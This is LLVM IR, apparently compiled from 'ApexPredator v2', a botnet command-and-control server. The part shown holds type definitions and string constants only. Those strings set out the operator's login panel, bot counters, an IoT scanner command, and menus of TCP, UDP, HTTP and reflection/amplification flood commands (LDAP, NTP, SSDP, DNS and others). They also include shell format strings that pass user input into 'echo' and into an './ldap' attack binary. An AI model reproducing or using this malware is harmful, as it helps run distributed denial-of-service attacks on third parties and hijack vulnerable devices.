; ModuleID = 'host/ir_O1/Apex_Predator.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], i8 }
%struct.telnetdata_t = type { i32, i32 }
%struct.account = type { [20 x i8], [20 x i8], [20 x i8] }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i16, [14 x i8] }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@clients = common local_unnamed_addr global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common local_unnamed_addr global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.219 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.8 = private unnamed_addr constant [64 x i8] c"%c]0; ApexPredator v2 | IoT Devices: %d | Apex Predators: %d %c\00", align 1
@.str.9 = private unnamed_addr constant [9 x i8] c"apex.txt\00", align 1
@.str.10 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.11 = private unnamed_addr constant [36 x i8] c"\1B[1;37m[\1B[0;36m%d.%d.%d.%d\1B[1;37m]\0A\00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"server.log\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.14 = private unnamed_addr constant [36 x i8] c"\0A\1B[1;37m[\1B[0;36m%d.%d.%d.%d\1B[1;37m]\00", align 1
@.str.15 = private unnamed_addr constant [6 x i8] c"admin\00", align 1
@accounts = internal global [25 x %struct.account] zeroinitializer, align 16
@.str.16 = private unnamed_addr constant [9 x i8] c"%s %s %s\00", align 1
@.str.17 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.18 = private unnamed_addr constant [32 x i8] c"\1B[0;31mUsername\1B[1;37m: \1B[1;37m\00", align 1
@.str.20 = private unnamed_addr constant [32 x i8] c"\1B[0;31mPassword\1B[1;37m: \1B[1;37m\00", align 1
@.str.21 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.22 = private unnamed_addr constant [23 x i8] c"Login Attempt Saved.\0D\0A\00", align 1
@.str.23 = private unnamed_addr constant [56 x i8] c"Please contact the owner if you run into this issue!!\0D\0A\00", align 1
@.str.24 = private unnamed_addr constant [15 x i8] c"\1B[1A\1B[2J\1B[1;1H\00", align 1
@.str.25 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [49 x i8] c"\1B[1;37m              Welome to the \1B[1;31mApex\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [71 x i8] c"\1B[1;37m  A place where all the \1B[1;31mApex Predators\1B[1;37m hang out\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [56 x i8] c"\1B[1;37m              Version 2 [\1B[1;31mcustom\1B[1;37m]\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [28 x i8] c"\1B[1;31mApexPredator\1B[1;37m#\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"bots\00", align 1
@.str.32 = private unnamed_addr constant [8 x i8] c"devices\00", align 1
@.str.33 = private unnamed_addr constant [8 x i8] c"DEVICES\00", align 1
@.str.34 = private unnamed_addr constant [141 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m.\1B[1;36mssh\1B[1;37m] - \1B[1;31m %d \0D\0A\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m.\1B[1;36musers\1B[1;37m] - \1B[1;31m %d \0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"Help\00", align 1
@.str.38 = private unnamed_addr constant [68 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]All Commands\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.39 = private unnamed_addr constant [84 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]---------------------------------------------------------\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;31mClear Screen\1B[1;37m]         CLEAR\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[1;32mLOGOUT\1B[1;37m]               LOGOUT\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;33mUsable Ports\1B[1;37m]         PORTS\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;34mRules\1B[1;37m]                RULES\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;36mSpoofing Methods\1B[1;37m]     SPOOF\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [54 x i8] c"\1B[1;37m[\1B[1;31mSpecial Commands\1B[1;37m]     SPECIAL\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[1;32mScanning Commands\1B[1;37m]    REAPER\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[1;33mStressing Commands\1B[1;37m]   STRESS\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [7 x i8] c"STRESS\00", align 1
@.str.49 = private unnamed_addr constant [7 x i8] c"stress\00", align 1
@.str.50 = private unnamed_addr constant [5 x i8] c"ddos\00", align 1
@.str.51 = private unnamed_addr constant [5 x i8] c"DDOS\00", align 1
@.str.52 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Method Listings\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [58 x i8] c"\1B[1;37m[\1B[1;31mLayer4 UDP\1B[1;37m]               L4UDP  \0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [58 x i8] c"\1B[1;37m[\1B[1;31mLayer4 TCP\1B[1;37m]               L4TCP  \0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [60 x i8] c"\1B[1;37m[\1B[1;31mLayer4 Spoofing\1B[1;37m]          L4SPOOF  \0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [55 x i8] c"\1B[1;37m[\1B[1;31mLayer7\1B[1;37m]                   L7  \0D\0A\00", align 1
@.str.57 = private unnamed_addr constant [6 x i8] c"L4UDP\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"l4udp\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"l4UDP\00", align 1
@.str.60 = private unnamed_addr constant [6 x i8] c"L4udp\00", align 1
@.str.61 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Layer 4 UDP Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.62 = private unnamed_addr constant [114 x i8] c"\1B[1;37m[\1B[1;31mUDP Flood\1B[1;37m]    !* UDP  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 0 1\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[1;31mSTD Flood\1B[1;37m]    !* STD  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.64 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[1;31mHOLD Flood\1B[1;37m]   !* HOLD [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[1;31mJUNK Flood\1B[1;37m]   !* JUNK [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.66 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;31mCNC Flood\1B[1;37m]    !* CNC  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mADMIN PORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"L4TCP\00", align 1
@.str.68 = private unnamed_addr constant [6 x i8] c"l4tcp\00", align 1
@.str.69 = private unnamed_addr constant [6 x i8] c"l4TCP\00", align 1
@.str.70 = private unnamed_addr constant [6 x i8] c"L4tcp\00", align 1
@.str.71 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Layer 4 TCP Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.72 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-ALL Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 ALL 0 1\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-SYN Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 SYN 0 1\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-FIN Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 FIN 0 1\0D\0A\00", align 1
@.str.75 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-RST Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 RST 0 1\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-PSH Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 PSH 0 1\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-CRI Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 CRI 0 1\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-PRO Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 PRO 0 1\0D\0A\00", align 1
@.str.79 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-ACK Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 ACK 0 1\0D\0A\00", align 1
@.str.80 = private unnamed_addr constant [120 x i8] c"\1B[1;37m[\1B[1;31mTCP-XMAS Flood\1B[1;37m] !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 XMAS 0 1\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [3 x i8] c"L7\00", align 1
@.str.82 = private unnamed_addr constant [3 x i8] c"l7\00", align 1
@.str.83 = private unnamed_addr constant [7 x i8] c"layer7\00", align 1
@.str.84 = private unnamed_addr constant [7 x i8] c"Layer7\00", align 1
@.str.85 = private unnamed_addr constant [7 x i8] c"LAYER7\00", align 1
@.str.86 = private unnamed_addr constant [79 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Layer 7 Method Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [88 x i8] c"\1B[1;37m[\1B[1;31mHTTP Flood\1B[1;37m]   !* HTTP  [\1B[1;31mURL\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [88 x i8] c"\1B[1;37m[\1B[1;31mWGET Flood\1B[1;37m]   !* WGET  [\1B[1;31mURL\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.89 = private unnamed_addr constant [8 x i8] c"L4SPOOF\00", align 1
@.str.90 = private unnamed_addr constant [8 x i8] c"l4spoof\00", align 1
@.str.91 = private unnamed_addr constant [8 x i8] c"l4SPOOF\00", align 1
@.str.92 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]Spoofing Commands\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.93 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;31mLDAP Flood\1B[1;37m]     !* LDAP     [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.94 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;32mNTP Flood\1B[1;37m]      !* NTP      [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.95 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;33mSSDP Flood\1B[1;37m]     !* SSDP     [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.96 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;34mDNS Flood\1B[1;37m]      !* DNS      [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.97 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;35mREAPER Flood\1B[1;37m]   !* REAPER   [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.98 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;36mMSSQL Flood\1B[1;37m]    !* MSSQL    [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.99 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;31mPORTMAP Flood\1B[1;37m]  !* PORTMAP  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.100 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;32mTS3 Flood\1B[1;37m]      !* TS3      [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.101 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;33mSENTINEL Flood\1B[1;37m] !* SENTINEL [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.102 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]Reflection Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.103 = private unnamed_addr constant [41 x i8] c"\1B[1;37m[\1B[1;31mLDAP\1B[1;37m]:\1B[1;31m 0 \0D\0A\00", align 1
@.str.104 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;32mNTP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.105 = private unnamed_addr constant [40 x i8] c"\1B[1;37m[\1B[1;33mSSDP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.106 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;34mDNS\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.107 = private unnamed_addr constant [42 x i8] c"\1B[1;37m[\1B[1;35mREAPER\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.108 = private unnamed_addr constant [41 x i8] c"\1B[1;37m[\1B[1;36mMSSQL\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.109 = private unnamed_addr constant [43 x i8] c"\1B[1;37m[\1B[1;31mPORTMAP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.110 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;32mTS3\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.111 = private unnamed_addr constant [44 x i8] c"\1B[1;37m[\1B[1;33mSENTINEL\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.112 = private unnamed_addr constant [8 x i8] c"SPECIAL\00", align 1
@.str.113 = private unnamed_addr constant [6 x i8] c"ADMIN\00", align 1
@.str.114 = private unnamed_addr constant [6 x i8] c"Admin\00", align 1
@.str.115 = private unnamed_addr constant [8 x i8] c"special\00", align 1
@.str.116 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]Special Commands\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.117 = private unnamed_addr constant [95 x i8] c"\1B[1;37m[\1B[1;31mAdds User\1B[1;37m]         root_add  [\1B[1;31mUSER\1B[1;37m] [\1B[1;31mPASS\1B[1;37m]\0D\0A\00", align 1
@.str.118 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;32mIP Geolocation\1B[1;37m]    root_geo  [\1B[1;31mIP\1B[1;37m]\0D\0A\00", align 1
@.str.119 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;33mSubDomain Scanner\1B[1;37m] root_sub  [\1B[1;31mURL\1B[1;37m]\0D\0A\00", align 1
@.str.120 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;34mPort Scanner\1B[1;37m]      root_scan [\1B[1;31mIP\1B[1;37m]\0D\0A\00", align 1
@.str.121 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;35mCloudFlare Bypass\1B[1;37m] root_cf   [\1B[1;31mURL\1B[1;37m]\0D\0A\00", align 1
@.str.122 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.123 = private unnamed_addr constant [77 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] Has Logged Out!\0A\00", align 1
@.str.124 = private unnamed_addr constant [11 x i8] c"LOGOUT.log\00", align 1
@.str.125 = private unnamed_addr constant [7 x i8] c"logout\00", align 1
@.str.126 = private unnamed_addr constant [5 x i8] c"MOVE\00", align 1
@.str.127 = private unnamed_addr constant [5 x i8] c"move\00", align 1
@.str.128 = private unnamed_addr constant [95 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] Has Attempted To Shell Your Bots!\0A\00", align 1
@.str.129 = private unnamed_addr constant [10 x i8] c"SHELL.log\00", align 1
@.str.130 = private unnamed_addr constant [94 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User: \1B[0;36m%s\1B[1;37m Has Attempted To Shell Your Bots!\0A\00", align 1
@.str.131 = private unnamed_addr constant [8 x i8] c"!* STOP\00", align 1
@.str.132 = private unnamed_addr constant [12 x i8] c"!* KILLATTK\00", align 1
@.str.133 = private unnamed_addr constant [25 x i8] c"[Reaper] Attack Stopped!\00", align 1
@.str.134 = private unnamed_addr constant [7 x i8] c"!* UDP\00", align 1
@.str.135 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mUDP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.136 = private unnamed_addr constant [7 x i8] c"!* STD\00", align 1
@.str.137 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mSTD \1B[1;37mFlood!\0D\0A\00", align 1
@.str.138 = private unnamed_addr constant [8 x i8] c"resolve\00", align 1
@.str.139 = private unnamed_addr constant [8 x i8] c"RESOLVE\00", align 1
@.str.140 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.141 = private unnamed_addr constant [66 x i8] c"Resolved \1B[1;37m[\1B[0;31m%s\1B[1;37m] to \1B[1;37m[\1B[0;31m%s\1B[1;37m]\0D\0A\00", align 1
@.str.142 = private unnamed_addr constant [60 x i8] c"\1B[1;37mYou Dont Have Permission To Use This\1B[0;31m!\1B[1;37\0D\0A\00", align 1
@.str.143 = private unnamed_addr constant [8 x i8] c"adduser\00", align 1
@.str.144 = private unnamed_addr constant [8 x i8] c"ADDUSER\00", align 1
@.str.145 = private unnamed_addr constant [22 x i8] c"echo '%s' >> apex.txt\00", align 1
@.str.146 = private unnamed_addr constant [90 x i8] c"\1B[1;37m[\1B[1;31mApex\1B[1;37m] \1B[1;37mUser:[\1B[0;36m%s\1B[1;37m] Added User:[\1B[0;36m%s\1B[1;37m]\0A\00", align 1
@.str.147 = private unnamed_addr constant [91 x i8] c"\1B[1;37m[\1B[1;31mApex\1B[1;37m] \1B[1;37mUser:[\1B[0;36m%s\1B[1;37m] Added User:[\1B[0;36m%s\1B[1;37m]\0D\0A\00", align 1
@.str.148 = private unnamed_addr constant [7 x i8] c"!* CNC\00", align 1
@.str.149 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mCNC \1B[1;37mFlood!\0D\0A\00", align 1
@.str.150 = private unnamed_addr constant [8 x i8] c"!* HTTP\00", align 1
@.str.151 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mHTTP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.152 = private unnamed_addr constant [8 x i8] c"!* JUNK\00", align 1
@.str.153 = private unnamed_addr constant [8 x i8] c"!* HOLD\00", align 1
@.str.154 = private unnamed_addr constant [7 x i8] c"!* TCP\00", align 1
@.str.155 = private unnamed_addr constant [57 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Loading sockets...\0D\0A\00", align 1
@.str.156 = private unnamed_addr constant [8 x i8] c"!* WGET\00", align 1
@.str.157 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mWGET \1B[1;37mFlood!\0D\0A\00", align 1
@.str.158 = private unnamed_addr constant [5 x i8] c"XMAS\00", align 1
@.str.159 = private unnamed_addr constant [124 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mT\1B[1;32mC\1B[1;33mP\1B[1;34m-\1B[1;35mX\1B[1;36mM\1B[1;31mA\1B[1;32mS \1B[1;37mFlood\0D\0A\00", align 1
@.str.160 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.161 = private unnamed_addr constant [103 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mTCP \1B[1;37mFlood using \1B[1;31mALL \1B[1;37mMethods!\0D\0A\00", align 1
@.str.162 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.163 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-SYN \1B[1;37mFlood\0D\0A\00", align 1
@.str.164 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.165 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-FIN \1B[1;37mFlood\0D\0A\00", align 1
@.str.166 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.167 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-RST \1B[1;37mFlood\0D\0A\00", align 1
@.str.168 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.169 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-ACK \1B[1;37mFlood\0D\0A\00", align 1
@.str.170 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.171 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-PSH \1B[1;37mFlood\0D\0A\00", align 1
@.str.172 = private unnamed_addr constant [4 x i8] c"PRO\00", align 1
@.str.173 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-PRO \1B[1;37mFlood\0D\0A\00", align 1
@.str.174 = private unnamed_addr constant [4 x i8] c"CRI\00", align 1
@.str.175 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-CRI \1B[1;37mFlood\0D\0A\00", align 1
@.str.176 = private unnamed_addr constant [5 x i8] c"ldap\00", align 1
@.str.177 = private unnamed_addr constant [5 x i8] c"LDAP\00", align 1
@.str.178 = private unnamed_addr constant [30 x i8] c"./ldap %s %s ldap.txt 2 -1 %s\00", align 1
@.str.179 = private unnamed_addr constant [70 x i8] c"[ApexPredator] Sending LDAP Attack to %s On Port %s For %s Seconds! \0A\00", align 1
@.str.180 = private unnamed_addr constant [10 x i8] c"root_ssdp\00", align 1
@.str.181 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mSSDP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.182 = private unnamed_addr constant [9 x i8] c"root_ntp\00", align 1
@.str.183 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mNTP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.184 = private unnamed_addr constant [14 x i8] c"root_sentinel\00", align 1
@.str.185 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mSENTINEL \1B[1;37mFlood!\0D\0A\00", align 1
@.str.186 = private unnamed_addr constant [9 x i8] c"root_dns\00", align 1
@.str.187 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mDNS \1B[1;37mFlood!\0D\0A\00", align 1
@.str.188 = private unnamed_addr constant [12 x i8] c"root_reaper\00", align 1
@.str.189 = private unnamed_addr constant [80 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mApexPredator \1B[1;37mFlood!\0D\0A\00", align 1
@.str.190 = private unnamed_addr constant [11 x i8] c"root_mssql\00", align 1
@.str.191 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mMSSQL \1B[1;37mFlood!\0D\0A\00", align 1
@.str.192 = private unnamed_addr constant [13 x i8] c"root_portmap\00", align 1
@.str.193 = private unnamed_addr constant [75 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mPORTMAP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.194 = private unnamed_addr constant [9 x i8] c"root_ts3\00", align 1
@.str.195 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mTS3 \1B[1;37mFlood!\0D\0A\00", align 1
@.str.196 = private unnamed_addr constant [14 x i8] c"!* SCANNER ON\00", align 1
